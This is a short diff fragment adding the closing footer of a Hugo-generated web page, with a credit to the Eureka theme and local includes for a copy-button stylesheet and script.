+ &middot;  Powered by the <a href="https://github.com/wangchucheng/hugo-eureka" class="hover:text-eureka">Eureka</a> theme for <a href="https://gohugo.io" class="hover:text-eureka">Hugo</a></p>
+</div>
+<link rel="stylesheet" href="../../css/copy-btn.css">
+<script src="../../js/copy-btn.js"></script></div>
+    </footer>
+  </body>
+</html>
